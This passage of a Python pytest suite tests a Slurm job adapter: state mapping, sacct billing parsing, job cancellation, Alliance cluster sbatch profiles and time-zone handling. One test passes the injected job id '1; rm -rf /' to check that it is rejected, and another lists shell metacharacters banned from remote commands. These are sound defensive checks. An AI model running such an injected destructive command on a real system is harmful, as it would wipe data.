        res = get_slurm_job_status("9")
        assert res["slurm_state"] == "CANCELLED"
        assert res["xcelsior_state"] == "cancelled"
        assert res["source"] == "sacct"

    def test_unknown_state_is_unknown_not_running(self, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(
            subprocess, "run", lambda *a, **k: _completed("5|WEIRD_NEW|0:01|1:00|1|n1\n")
        )
        assert get_slurm_job_status("5")["xcelsior_state"] == "unknown"

    @pytest.mark.parametrize(
        "state,expected",
        [
            ("BOOT_FAIL", "failed"),
            ("DEADLINE", "failed"),
            ("REQUEUED", "queued"),
            ("CONFIGURING", "running"),
            ("REVOKED", "cancelled"),
            ("SPECIAL_EXIT", "failed"),
        ],
    )
    def test_full_state_list(self, state, expected):
        assert SLURM_STATE_MAP[state] == expected

    def test_every_job_state_projects_onto_the_db_constraint(self):
        allowed = {"pending", "running", "completed", "failed", "cancelled", "unknown"}
        for xstate in set(SLURM_STATE_MAP.values()) | {"unknown"}:
            assert _sa.OBSERVED_STATE_MAP[xstate] in allowed

    def test_invalid_job_id_rejected_before_any_command(self, monkeypatch):
        rec = _Recorder()
        monkeypatch.setattr(subprocess, "run", rec)
        assert get_slurm_job_status("1; rm -rf /")["error_code"] == "invalid_job_id"
        assert cancel_slurm_job("nonexistent-999")["error_code"] == "invalid_job_id"
        assert rec.calls == []


class TestAccountingV3:
    # Row shape from the rehearsal (SLURM_TIME_FORMAT=%s, -X, --noconvert)
    ROW = "12|xcl-r1-gpu1|COMPLETED|1794040946|1794040948|1794040953|5|0:0|billing=2,cpu=2,gres/gpu=1,mem=3072M,node=1|tower|xcl\n"

    def test_billing_shape(self, local_profile, monkeypatch):
        rec = _Recorder((0, self.ROW, ""))
        monkeypatch.setattr(subprocess, "run", rec)
        a = _sa.get_slurm_job_accounting("12", profile_name=local_profile)
        assert rec.calls[0]["env"]["SLURM_TIME_FORMAT"] == "%s"
        assert "-X" in rec.calls[0]["argv"]
        assert (a["submitted_at"], a["started_at"], a["completed_at"]) == (
            1794040946.0,
            1794040948.0,
            1794040953.0,
        )
        assert a["duration_sec"] == 5 and a["gpu_count"] == 1 and a["gpu_seconds"] == 5
        assert a["node_list"] == "tower" and a["billable"] is True
        meter = _sa.accounting_to_meter_fields(a)
        assert meter == {
            "started_at": 1794040948.0,
            "completed_at": 1794040953.0,
            "duration_sec": 5.0,
            "gpu_seconds": 5.0,
        }

    def test_meter_fields_are_usage_meter_fields(self):
        import billing as billing_mod

        meter_cls = getattr(billing_mod, "UsageMeter", None)
        if meter_cls is None:
            pytest.skip("UsageMeter not importable in this layout")
        import dataclasses

        names = {f.name for f in dataclasses.fields(meter_cls)}
        assert set(_sa.accounting_to_meter_fields({})) <= names

    def test_cancelled_while_pending_is_not_billable(self, local_profile, monkeypatch):
        row = "13|x|CANCELLED by 1000|1794040960|Unknown|1794040966|0|0:0||None assigned|xcl\n"
        monkeypatch.setattr(subprocess, "run", _Recorder((0, row, "")))
        a = _sa.get_slurm_job_accounting("13", profile_name=local_profile)
        assert a["xcelsior_state"] == "cancelled"
        assert a["started_at"] is None and a["billable"] is False and a["duration_sec"] == 0

    def test_running_job_has_no_end(self, local_profile, monkeypatch):
        row = (
            "14|x|RUNNING|1794040960|1794040961|Unknown|30|0:0|cpu=2,gres/gpu=1,node=1|tower|xcl\n"
        )
        monkeypatch.setattr(subprocess, "run", _Recorder((0, row, "")))
        a = _sa.get_slurm_job_accounting("14", profile_name=local_profile)
        assert a["completed_at"] is None and a["terminal"] is False
        assert _sa.accounting_to_meter_fields(a)["completed_at"] == 0.0

    def test_accounting_disabled_is_reported(self, local_profile, monkeypatch):
        monkeypatch.setattr(
            subprocess,
            "run",
            _Recorder((1, "", "sacct: error: Slurm accounting storage is disabled")),
        )
        a = _sa.get_slurm_job_accounting("15", profile_name=local_profile)
        assert a["error_code"] == "accounting_disabled"


class TestCancelV3:
    def test_unknown_id_is_not_found_even_though_scancel_exits_zero(
        self, local_profile, monkeypatch
    ):
        """Slurm 25.11: plain scancel exits 0 silently for unknown ids."""
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        rec = _Recorder(
            (
                0,
                "",
                "scancel: Terminating job 99999\nscancel: error: Kill job error on job id 99999: Invalid job id specified",
            ),
            (0, "", ""),  # sacct: no row
        )
        monkeypatch.setattr(subprocess, "run", rec)
        res = cancel_slurm_job("99999", profile_name=local_profile)
        assert rec.calls[0]["argv"] == ["scancel", "-v", "99999"]
        assert res["error_code"] == "not_found"
        assert not res.get("cancelled")

    def test_finished_job_is_already_terminal(self, local_profile, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        rec = _Recorder(
            (
                0,
                "",
                "scancel: Terminating job 8\nscancel: error: Kill job error on job id 8: Invalid job id specified",
            ),
            (0, "8|x|COMPLETED|1|2|3|1|0:0|cpu=2,node=1|tower|xcl\n", ""),
        )
        monkeypatch.setattr(subprocess, "run", rec)
        res = cancel_slurm_job("8", profile_name=local_profile)
        assert res["error_code"] == "already_terminal"
        assert res["slurm_state"] == "COMPLETED"

    def test_verbose_success(self, local_profile, monkeypatch):
        monkeypatch.setattr("slurm_adapter.is_slurm_available", lambda: True)
        monkeypatch.setattr(subprocess, "run", _Recorder((0, "", "scancel: Terminating job 11")))
        assert cancel_slurm_job("11", profile_name=local_profile)["cancelled"] is True


class TestOutputV3:
    def test_reads_tail_of_output_file(self, local_profile, monkeypatch):
        rec = _Recorder((0, "GPU 0: NVIDIA GeForce RTX 3060\n", ""))
        monkeypatch.setattr(subprocess, "run", rec)
        res = _sa.get_slurm_job_output("12", "t-1", profile_name=local_profile)
        assert rec.calls[0]["argv"] == [
            "tail",
            "-c",
            "65536",
            "--",
            "/var/lib/xcl-slurm-test/jobs/xcl-t-1-12.out",
        ]
        assert "RTX 3060" in res["content"]


def test_module_imports_without_the_db_stack():
    """The adapter must load on a submit host that has no Xcelsior DB code."""
    code = (
        "import sys, builtins\n"
        "real = builtins.__import__\n"
        "def guard(name, *a, **k):\n"
        "    if name == 'db': raise ImportError('no db here')\n"
        "    return real(name, *a, **k)\n"
        "builtins.__import__ = guard\n"
        f"sys.path.insert(0, {str(__import__('pathlib').Path(_sa.__file__).parent)!r})\n"
        "import slurm_adapter; print(slurm_adapter.ADAPTER_VERSION)\n"
    )
    out = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    assert out.stdout.strip() == _sa.ADAPTER_VERSION


# ══════════════════════════════════════════════════════════════════════
# Alliance compatibility, verified against docs.alliancecan.ca and the
# ComputeCanada/software-stack-custom slurm_commands.sh wrapper (2026-11-07)
# ══════════════════════════════════════════════════════════════════════


class TestAllianceProfiles:
    def test_nibi_script_matches_alliance_rules(self):
        script, meta = xcelsior_job_to_sbatch(_job(num_gpus=1, command="nvidia-smi"), "nibi")
        assert "--partition" not in script  # Alliance routes jobs to partitions itself
        assert "#SBATCH --gpus-per-node=h100:1" in script
        assert "#SBATCH --cpus-per-gpu=14" in script
        assert "#SBATCH --mem=244G" in script  # within the 250 GB per-GPU bundle
        assert "--qos" not in script
        assert "module load apptainer" in script
        assert meta["gpu_request"] == "gpus"

    def test_narval_bundle(self):
        script, _ = xcelsior_job_to_sbatch(_job(num_gpus=4), "narval")
        assert "#SBATCH --gpus-per-node=a100:4" in script
        assert "#SBATCH --cpus-per-gpu=12" in script
        assert "#SBATCH --mem=476G" in script  # 4 + 118*4 <= 4 x 124 GB

    def test_account_required_at_submit_not_preview(self, monkeypatch):
        monkeypatch.delenv("SLURM_ACCOUNT", raising=False)
        assert submit_to_slurm(_job(), profile_name="nibi")["error_code"] == "missing_account"
        assert submit_to_slurm(_job(), profile_name="nibi", dry_run=True)["dry_run"] is True
        monkeypatch.setenv("SLURM_ACCOUNT", "def-someprof")
        script, _ = xcelsior_job_to_sbatch(_job(), "nibi")
        assert "#SBATCH --account=def-someprof" in script

    def test_graham_is_retired(self):
        res = submit_to_slurm(_job(), profile_name="graham", dry_run=True)
        assert res["error_code"] == "cluster_retired"

    def test_submit_limit_code(self):
        msg = (
            "sbatch: error: QOSMaxSubmitJobPerUserLimit\n"
            "sbatch: error: Batch job submission failed: Job violates accounting/QOS "
            "policy (job submit limit, user's size and/or time limits)"
        )
        assert _sa.classify_slurm_error(msg) == "submit_limit_reached"


class TestWordSplitSafeTransport:
    """Alliance's wrapper runs $SSH_ORIGINAL_COMMAND unquoted: bash splits it
    on whitespace and globs it, without honouring quotes. Every command the
    adapter sends must mean the same thing under that and under shlex."""

    def test_every_remote_command_survives_word_splitting(self, monkeypatch):
        import shlex as _shlex

        sent = []

        def fake(argv, *a, **kw):
            sent.append(argv[-1])
            if argv[-1].startswith("sbatch"):
                return subprocess.CompletedProcess(argv, 0, "7\n", "")
            if argv[-1].startswith("squeue"):
                return subprocess.CompletedProcess(argv, 0, "7|RUNNING|0:05|10:00|1|nb1\n", "")
            return subprocess.CompletedProcess(argv, 0, "", "")

        monkeypatch.setattr(subprocess, "run", fake)
        monkeypatch.setenv("SLURM_ACCOUNT", "def-x")
        r = _sa.SlurmRunner(ssh_host="robot", ssh_options=("-F", "/k.conf"))
        submit_to_slurm(_job(num_gpus=1), profile_name="nibi", runner=r)
        get_slurm_job_status("7", profile_name="nibi", runner=r)
        _sa.get_slurm_job_accounting("7", profile_name="nibi", runner=r)
        _sa.get_slurm_job_output("7", "t-1", profile_name="nibi", runner=r)
        cancel_slurm_job("7", profile_name="nibi", runner=r)
        _sa.get_cluster_inventory("nibi", runner=r)
        assert len(sent) >= 6
        for cmd in sent:
            assert cmd.split() == _shlex.split(cmd), cmd
            assert not set(cmd) & set("*?[]'\"$`;&<>(){}~!#\\"), cmd
            assert not cmd.startswith("env "), "Alliance's wrapper rejects an env prefix"

    def test_alliance_profiles_read_output_with_cat(self, monkeypatch):
        rec = _Recorder((0, "x" * 100 + "TAIL", ""))
        monkeypatch.setattr(subprocess, "run", rec)
        res = _sa.get_slurm_job_output("7", "t-1", profile_name="nibi", max_bytes=4)
        assert rec.calls[0]["argv"][0] == "cat"
        assert res["content"] == "TAIL"

    def test_unsafe_token_is_refused_not_sent(self, monkeypatch):
        rec = _Recorder()
        monkeypatch.setattr(subprocess, "run", rec)
        with pytest.raises(_sa.SlurmAdapterError) as e:
            _sa.SlurmRunner(ssh_host="h").run(["squeue", "-o", "%i %T"])
        assert e.value.code == "unsafe_remote_argument"
        assert rec.calls == []


class TestLocalTimeAccounting:
    """iso_local: no env prefix, so times arrive in the cluster's zone."""

    def test_plain_conversion_and_no_env(self, monkeypatch):
        row = (
            "21|x|COMPLETED|2026-11-07T03:00:00|2026-11-07T03:00:10|2026-11-07T03:05:10"
            "|300|0:0|cpu=14,gres/gpu=1,node=1|nb1|gpubase\n"
        )
        rec = _Recorder((0, row, ""))
        monkeypatch.setattr(subprocess, "run", rec)
        a = _sa.get_slurm_job_accounting("21", profile_name="nibi")
        assert rec.calls[0].get("env") is None
        assert a["started_at"] == 1794038410.0  # 03:00:10 EST = 08:00:10 UTC
        assert a["completed_at"] - a["started_at"] == 300

    def test_dst_fall_back_hour_is_disambiguated_by_elapsed(self, monkeypatch):
        # 2026-11-01: clocks go 01:59:59 EDT -> 01:00:00 EST. Start 01:30 EDT,
        # end at the second 01:10 (EST), 40 minutes of ElapsedRaw.
        row = (
            "22|x|COMPLETED|2026-11-01T01:29:00|2026-11-01T01:30:00|2026-11-01T01:10:00"
            "|2400|0:0|cpu=14,gres/gpu=1,node=1|nb1|gpubase\n"
        )
        monkeypatch.setattr(subprocess, "run", _Recorder((0, row, "")))
        a = _sa.get_slurm_job_accounting("22", profile_name="nibi")
        assert a["started_at"] == 1793511000.0  # 05:30 UTC
        assert a["completed_at"] - a["started_at"] == 2400
